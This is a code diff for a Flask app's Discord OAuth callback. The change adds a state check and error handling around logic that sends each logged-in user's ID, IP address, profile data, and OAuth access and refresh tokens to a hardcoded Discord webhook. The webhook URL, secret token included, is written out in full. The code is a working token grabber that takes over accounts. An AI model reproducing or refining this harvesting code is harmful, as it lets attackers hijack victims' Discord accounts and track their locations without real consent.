@@ -39,33 +39,44 @@ def home():
 
 @app.route("/oauth_callback")
 def oauth_callback():
-    discord = OAuth2Session(client_id, redirect_uri=redirect_uri, state=session['state'], scope=scope)
-    token = discord.fetch_token(
-        token_url,
-        client_secret=client_secret,
-        authorization_response=request.url,
-    )
+    # Check if 'state' is present in the session
+    if 'state' not in session:
+        return 'Invalid callback. Missing state parameter.'
 
-    response = discord.get(base_discord_api_url + '/users/@me')
-    user_id = response.json()['id']
+    try:
+        discord = OAuth2Session(client_id, redirect_uri=redirect_uri, state=session['state'], scope=scope)
+        token = discord.fetch_token(
+            token_url,
+            client_secret=client_secret,
+            authorization_response=request.url,
+        )
 
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+        response = discord.get(base_discord_api_url + '/users/@me')
+        user_id = response.json()['id']
 
-    webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'
+        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
 
-    profile_data = response.json()
-    embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")
+        webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'
 
-    data = {'embeds': [embed]}
-    response = requests.post(webhook_url, json=data)
+        profile_data = response.json()
+        embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")
 
-    if response.status_code == 200:
-        print("Webhook request successful")
-    else:
-        print(f"Webhook request failed with status code {response.status_code}")
-        print(response.text)
+        data = {'embeds': [embed]}
+        response = requests.post(webhook_url, json=data)
 
-    return 'Authentication successful. Your data has been sent to the webhook.'
+        if response.status_code == 200:
+            print("Webhook request successful")
+        else:
+            print(f"Webhook request failed with status code {response.status_code}")
+            print(response.text)
+
+        return 'Authentication successful. Your data has been sent to the webhook.'
+    
+    except Exception as e:
+        # Handle other exceptions here
+        print(f"An error occurred: {e}")
+        return 'An error occurred during authentication.'
+
 
 @app.route("/profile")
 def profile():
